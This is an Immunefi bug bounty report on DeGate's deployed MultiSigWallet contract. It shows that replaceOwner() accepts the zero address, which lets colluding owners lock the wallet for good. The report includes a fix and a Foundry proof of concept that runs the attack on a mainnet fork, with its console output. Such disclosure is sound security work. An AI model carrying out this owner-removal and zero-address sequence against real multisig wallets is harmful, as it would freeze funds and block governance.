# 26124 - \[SC - Insight] Some owners of the MultiSigWallet can bring the...

Submitted on Nov 25th 2023 at 17:38:27 UTC by @savi0ur for [Boost | DeGate](https://immunefi.com/bounty/boosteddegatebugbounty/)

Report ID: #26124

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0x2028834B2c0A36A918c10937EeA71BE4f932da52#code>

Impacts:

* Unintended functionality of multisig owners

## Description

## Bug Description

The vulnerability occurs due to `removeOwner()` and `replaceOwner()`. `replaceOwner()` allows replacing `newOwner` to be an address(0).

This is the `removeOwner(address owner)`, which allows them to remove themselves. It also adjusting `required = owners.length` after removal of owner if `required > owners.length`.

**Note:** When `required > owners.length`, then `required == owners.length`. So future submitted transactions need 100% approvals from remaining owners inorder to get executed.

```solidity
function removeOwner(address owner)
    public
    onlyWallet
    ownerExists(owner)
{
    isOwner[owner] = false;
    for (uint i=0; i<owners.length - 1; i++) 
        if (owners[i] == owner) {
            owners[i] = owners[owners.length - 1];
            break;
        }
    owners.length -= 1;
    if (required > owners.length) 
        changeRequirement(owners.length);
    OwnerRemoval(owner);
}

modifier onlyWallet() {
    if (msg.sender != address(this))
        throw;
    _;
}

modifier ownerExists(address owner) {
    if (!isOwner[owner])
        throw;
    _;
}

function changeRequirement(uint _required)
    public
    onlyWallet
    validRequirement(owners.length, _required)
{
    required = _required;
    RequirementChange(_required);
}
```

This is the `replaceOwner(address owner, address newOwner)`. Which allows `owner` to get replaced with `newOwner`.

```solidity
function replaceOwner(address owner, address newOwner)
    public
    onlyWallet
    ownerExists(owner)
    ownerDoesNotExist(newOwner)
{
    for (uint i=0; i<owners.length; i++)
        if (owners[i] == owner) {
            owners[i] = newOwner;
            break;
        }
    isOwner[owner] = false;
    isOwner[newOwner] = true;
    OwnerRemoval(owner);
    OwnerAddition(newOwner);
}

modifier onlyWallet() {
    if (msg.sender != address(this))
        throw;
    _;
}

modifier ownerExists(address owner) {
    if (!isOwner[owner])
        throw;
    _;
}

modifier ownerDoesNotExist(address owner) {
    if (isOwner[owner])
        throw;
    _;
}
```

**Note:** `replaceOwner(address owner, address newOwner)` is requiring `isOwner[owner] == true` and `isowner[newOwner] == false`, using `ownerExists` and `ownerDoesNotExist` modifier. But its not checking for `newOwner` to be not null. So its allowing `owner` to replace itself with an `address(0)`.

Attack could happens when atleast `owners.length - required + 1` number of owners are malicious. In 4/6 multisig, `6 - 4 + 1 = 3` owners and 5/6, `6 - 5 + 1 = 2` owners only are required to be malicious, which is always less than `required` when `required > owners.length / 2`.

This is an attack scenario with 4/6 multisig:

1. `owners.length - required` number of owners can remove themselves using `removeOwner()`, to make `required == owners.length` i.e., 4 == 4.
2. One more owner can replace itself with null address, which still hold 4 == 4 but one of the owner is now null address and no one owns this null address.
3. So, even though all the remaining 3 owners `confirmTransaction` for all the future transactions(say they now want to change `required = 3` using `changeRequirement(uint _required)` tx), condition to `executeTransaction` i.e., `required == #confirmation` (4 == 4 confirmations) can never be satisfied.
4. Since nothing can be upgraded, proxy have to be re-deployed with state migration from locked proxy to the new deployed proxy.

## Impact

Some owners of the MultiSigWallet can bring the system in a state where future upgrade/any operation is impossible

## Recommendation

We recommend to not allow any owner to get replaced with null address using `replaceOwner(address owner, address newOwner)` by adding a check `notNull(newOwner)`.

## References

* Gnosis MultiSig - <https://etherscan.io/address/0x2028834B2c0A36A918c10937EeA71BE4f932da52?utm\\_source=immunefi#code>

## Proof Of Concept

**Steps to Run using Foundry:**

* Install Foundry (<https://book.getfoundry.sh/getting-started/installation>)
* Open terminal and run `forge init poc` and `cd poc`
* Paste following foundry code in POC.t.sol
* Run using `forge test -vv`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;
pragma abicoder v2;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IMultiSigWallet {
    function owners(uint256) external view returns (address);
    function removeOwner(address owner) external;
    function isOwner(address) external view returns (bool);
    function confirmations(uint256, address) external view returns (bool);
    function getTransactionCount(bool pending, bool executed) external view returns (uint256 count);
    function isConfirmed(uint256 transactionId) external view returns (bool);
    function getConfirmationCount(uint256 transactionId) external view returns (uint256 count);
    function transactions(uint256) external view returns (address destination, uint256 value, bytes memory data, bool executed);
    function getOwners() external view returns (address[] memory);
    function getTransactionIds(
        uint256 from,
        uint256 to,
        bool pending,
        bool executed
    ) external view returns (uint256[] memory _transactionIds);
    function getConfirmations(uint256 transactionId)
        external
        view
        returns (address[] memory _confirmations);
    function transactionCount() external view returns (uint256);
    function changeRequirement(uint256 _required) external;
    function confirmTransaction(uint256 transactionId) external;
    function submitTransaction(
        address destination,
        uint256 value,
        bytes memory data
    ) external returns (uint256 transactionId);
    function required() external view returns (uint256);
    function replaceOwner(address owner, address newOwner) external;
    function executeTransaction(uint256 transactionId) external;
    fallback() external payable;
    receive() external payable;
}

contract POC is Test {
    IMultiSigWallet c = IMultiSigWallet(payable(0x2028834B2c0A36A918c10937EeA71BE4f932da52));

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth");
    }

    function testRemoveReplaceOwnersBlockingUpgradesPOC() public { 
        address[] memory owners = c.getOwners();
        console.log("Before remove, Owners:");
        for(uint i; i < owners.length; i++) {
            console.log("%d. %s", i, owners[i]);
        }

        uint required = c.required();
        uint initial_tx_id;
        for(uint i;i < owners.length - required; i++) {
            vm.startPrank(owners[i], owners[i]);
            uint _tx_id = c.submitTransaction(address(c), 0, abi.encodeWithSignature("removeOwner(address)", owners[i]));
            console.log("Submitted tx with id : %d to remove owner : %s", _tx_id, owners[i]);
            if (i == 0) {
                initial_tx_id = _tx_id;
            }
            vm.stopPrank();
        }

        console.log("Confirming transaction %d", initial_tx_id);
        vm.prank(owners[1]);
        c.confirmTransaction(initial_tx_id);
        vm.prank(owners[2]);
        c.confirmTransaction(initial_tx_id);
        vm.prank(owners[3]);
        c.confirmTransaction(initial_tx_id);
        console.log("Owner0 is removed");

        console.log("Confirming transaction %d", initial_tx_id + 1);
        vm.prank(owners[4]);
        c.confirmTransaction(initial_tx_id + 1);
        vm.prank(owners[2]);
        c.confirmTransaction(initial_tx_id + 1);
        vm.prank(owners[3]);
        c.confirmTransaction(initial_tx_id + 1);
        console.log("Owner1 is removed");

        console.log("prev required: %d", required);
        console.log("prev #owners : %d", owners.length);

        owners = c.getOwners();
        require(required == owners.length, "required is not equal to the number of owners");

        console.log("After remove, Owners:");
        for(uint i; i < owners.length; i++) {
            console.log("%d. %s", i, owners[i]);
        }        

        required = c.required();
        console.log("new required: %d", required);
        console.log("new #owners : %d", owners.length);

        console.log("Replacing owner0 with address(0)");
        vm.prank(owners[0], owners[0]);
        uint tx_id = c.submitTransaction(address(c), 0, abi.encodeWithSignature("replaceOwner(address,address)", owners[0], address(0)));
        console.log("Submitted tx with id : %d to replace owner : %s with address zero", tx_id, owners[0]);

        console.log("Confirming tx with id : %d", tx_id);
        for(uint i = 1; i < owners.length; i++) {
            vm.prank(owners[i], owners[i]);
            c.confirmTransaction(tx_id);
        }

        (,,,bool executed) = c.transactions(tx_id);
        require(executed, "!Executed");

        owners = c.getOwners();
        console.log("After replace, Owners:");
        for(uint i; i < owners.length; i++) {
            console.log("%d. %s", i, owners[i]);
        }
        
        bool isZeroAnOwner = c.isOwner(address(0));
        console.log("ASSERTING: Is address(0) an owner: %s", isZeroAnOwner);

        require(isZeroAnOwner);

        console.log("Now remaining 3 valid owners tries to update requirement to 3");
        uint new_requirement = 3;
        vm.prank(owners[1], owners[1]);
        tx_id = c.submitTransaction(address(c), 0, abi.encodeWithSignature("changeRequirement(uint256)", new_requirement));
        console.log("Submitted tx with id : %d to change requirement to %d", tx_id, new_requirement);

        console.log("Confirming tx with id : %d", tx_id);
        for(uint i; i < owners.length; i++) {
            if (owners[i] == address(0) || i == 1) continue; // Since no one owns address(0) and owner1 already confirmed tx
            vm.prank(owners[i], owners[i]);
            c.confirmTransaction(tx_id);
        }

        bool isConfirmed = c.isConfirmed(tx_id);
        console.log("Is tx id : %d, confirmed? : %s", tx_id, isConfirmed);
        require(!isConfirmed, "Confirmed");
    }
}
```

**Console Output:**

```console
  Before remove, Owners:
  0. 0xf5020ADf433645c451A4809eac0d6F680709f11B
  1. 0xeD530f3b8675B0a576DaAe64C004676c65368DfD
  2. 0xB7093FC2d926ADdE48122B70991fe68374879adf
  3. 0xC715b8501039d3514787dC55BC09f89c293351e9
  4. 0x6EF4e54E049A5FffB629063D3a9ee38ac27551C8
  5. 0x3Cd51A933b0803DDCcDF985A7c71C1C7357FE9Eb
  Submitted tx with id : 5 to remove owner : 0xf5020ADf433645c451A4809eac0d6F680709f11B
  Submitted tx with id : 6 to remove owner : 0xeD530f3b8675B0a576DaAe64C004676c65368DfD
  Confirming transaction 5
  Owner0 is removed
  Confirming transaction 6
  Owner1 is removed
  prev required: 4
  prev #owners : 6
  After remove, Owners:
  0. 0x3Cd51A933b0803DDCcDF985A7c71C1C7357FE9Eb
  1. 0x6EF4e54E049A5FffB629063D3a9ee38ac27551C8
  2. 0xB7093FC2d926ADdE48122B70991fe68374879adf
  3. 0xC715b8501039d3514787dC55BC09f89c293351e9
  new required: 4
  new #owners : 4
  Replacing owner0 with address(0)
  Submitted tx with id : 7 to replace owner : 0x3Cd51A933b0803DDCcDF985A7c71C1C7357FE9Eb with address zero
  Confirming tx with id : 7
  After replace, Owners:
  0. 0x0000000000000000000000000000000000000000
  1. 0x6EF4e54E049A5FffB629063D3a9ee38ac27551C8
  2. 0xB7093FC2d926ADdE48122B70991fe68374879adf
  3. 0xC715b8501039d3514787dC55BC09f89c293351e9
  ASSERTING: Is address(0) an owner: true
  Now remaining 3 valid owners tries to update requirement to 3
  Submitted tx with id : 8 to change requirement to 3
  Confirming tx with id : 8
  Is tx id : 8, confirmed? : false
```
